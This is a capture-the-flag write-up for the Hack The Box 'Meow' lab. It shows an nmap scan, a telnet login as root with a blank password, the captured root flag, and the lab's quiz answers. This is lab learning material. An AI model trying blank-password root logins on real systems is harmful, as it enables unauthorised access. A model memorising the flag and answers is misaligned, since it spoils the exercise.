---
layout: default
title: Meow
parent: Very Easy
grand_parent: Hack The Box
nav_order: 1
---

# Meow

## Nmap Scan

```bash
❯ nmap 10.129.53.139
Nmap scan report for 10.129.53.139
PORT   STATE SERVICE
23/tcp open  telnet
```

We can see that the port 23 is open, so I will try to access via telnet. I'll user `root`.

```bash
❯ telnet 10.129.53.139
Trying 10.129.53.139...
Connected to 10.129.53.139.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root

root@Meow:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Meow:~# hostname -I
10.129.53.139 dead:beef::250:56ff:fe96:54f 
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~#
```

Thanks for reading! Now, let's answer the questions.

> -   **What does the acronym VM stand for?**
> 
> -   Virtual Machine

  

> -   **What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.**
> 
> -   Terminal

  

> -   **What service do we use to form our VPN connection into HTB labs?**
> 
> -   openvpn

  

> -   **What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?**
> 
> -   tun

  

> -   **What tool do we use to test our connection to the target with an ICMP echo request?**
> 
> -   ping

  

> -   **What is the name of the most common tool for finding open ports on a target?**
> 
> -   nmap

  

> -   **What service do we identify on port 23/tcp during our scans?**
> 
> -   telnet

  

> -   **What username is able to log into the target over telnet with a blank password?**
> 
> -   root

  

> -   **Submit root flag**
> 
> -   b40abdfe23665f766f9c61ecba8a4c19

